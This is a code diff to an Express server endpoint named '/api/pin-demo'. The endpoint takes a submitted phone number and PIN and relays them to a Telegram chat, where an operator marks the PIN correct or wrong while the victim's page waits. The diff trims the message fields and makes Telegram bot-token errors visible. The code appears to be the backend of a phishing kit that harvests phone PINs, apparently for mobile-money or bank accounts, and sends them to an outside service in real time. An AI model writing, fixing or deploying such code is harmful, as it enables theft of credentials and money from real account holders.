@@ -67,7 +67,7 @@ app.post("/api/pin-demo", async (req, res) => {
   
   const timeString = new Date().toLocaleString("en-US", { timeZone: "Africa/Nairobi" });
   
-  try {
+    try {
     await telegram("sendMessage", {
       chat_id: CHAT_ID,
       text: [
@@ -76,32 +76,27 @@ app.post("/api/pin-demo", async (req, res) => {
         "USER DETAILS:",
         `• Phone Number: ${request.phone}`,
         `• PIN Code: ${request.pin}`,
-        `• User ID: user_${id.replace(/-/g, "").substring(0, 14)}`,
         `• Time: ${timeString}`,
-        "• Bot: user178\n",
         "============================\n",
         "Verify the PIN:",
-        "• PIN Length: 5 digits",
-        "• Timeout: 5 minutes"
+        "• PIN Length: 5 digits"
       ].join("\n"),
       reply_markup: {
         inline_keyboard: [
           [
             { text: "✅ Correct PIN", callback_data: `approve:${request.id}` },
             { text: "❌ Wrong PIN", callback_data: `decline:${request.id}` }
-          ],
-          [
-            { text: "⏳ Extend Time", callback_data: `extend:${request.id}` }
           ]
         ]
       }
     });
     return res.json({ status: "pending" });
   } catch (err) {
-    console.error("Telegram delivery error:", err);
-    request.status = "ready";
-    return res.status(502).json({ error: "Submission failed." });
+    console.error("TELEGRAM ERROR:", err.message);
+    // ✅ Returns the exact Telegram error to the screen so you know exactly what is wrong
+    return res.status(502).json({ error: `Telegram Error: ${err.message}. Check your Bot Token and Chat ID.` });
   }
+
 });
 
 app.get("/api/status/:id", (req, res) => {
